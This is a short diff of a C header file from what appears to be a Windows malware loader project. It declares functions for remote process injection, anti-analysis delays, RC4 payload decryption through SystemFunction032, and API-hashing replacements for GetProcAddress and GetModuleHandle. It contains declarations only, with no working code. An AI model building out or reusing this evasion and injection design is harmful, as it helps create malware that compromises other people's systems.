@@ -597,6 +597,7 @@ LPCWSTR LowerCaseStringW(IN LPCWSTR String);
 WCHAR ToLowerCharW(IN WCHAR character);
 SIZE_T StringLengthW(IN LPCWSTR String);
 INT StringCompareA(IN LPCSTR String1, IN LPCSTR String2);
+BOOL IsStringEqual(IN LPCWSTR Str1, IN LPCWSTR Str2);
 
 // Defined in Injection.c
 BOOL GetRemoteProcessHandle(IN LPCWSTR szProcName, IN DWORD* pdwPid, IN HANDLE* phProcess);
@@ -608,7 +609,7 @@ BOOL InstallMouseHook();
 BOOL DelayExec(DWORD dwMilliSeconds);
 BOOL AntiAnalysis(DWORD dwMilliSeconds);
 
-// Defined in Cryptor.c
+// Defined and used in Cryptor.c
 extern unsigned char ProtectedKey[];
 
 #define KEY_SIZE 16
@@ -628,5 +629,9 @@ typedef NTSTATUS(NTAPI* fnSystemFunction032) (
 
 BOOL Rc4DecryptionViSystemFunc032(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize);
 
-// Defined in ApiHashing.cx`
+// Defined and used by ApiHashing.cx
 FARPROC GetProcAddressReplacement(IN HMODULE hModule, IN LPCSTR lpApiName);
+
+#define CONTAINING_RECORD(address, type, field) ((type *)( (char *)(address) - (ULONG_PTR)(&((type *)0)->field) ))
+
+HMODULE GetModuleHandleReplacement(IN LPCWSTR szModuleName);
